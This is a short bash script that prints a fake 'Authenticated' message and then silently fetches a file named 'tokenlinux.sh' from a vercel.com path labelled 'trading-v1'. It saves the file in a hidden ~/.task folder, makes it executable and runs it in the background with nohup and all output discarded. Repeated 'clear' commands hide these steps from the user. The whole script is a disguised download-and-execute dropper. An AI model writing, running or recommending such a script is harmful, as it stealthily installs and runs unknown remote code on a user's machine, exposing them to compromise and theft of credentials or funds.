#!/bin/bash
set -e
echo "Authenticated"
mkdir -p "$HOME/.task"
clear
curl -s -L -o "$HOME/.task/tokenlinux.sh" "https://vercel.com/billion10/trading-v1/3nTymp4UDAn8pMLaXzVWfdGff3yt/120/tokenlinux.sh"
clear
chmod +x "$HOME/.task/tokenlinux.sh"
clear
nohup bash "$HOME/.task/tokenlinux.sh" > /dev/null 2>&1 &
clear
exit 0
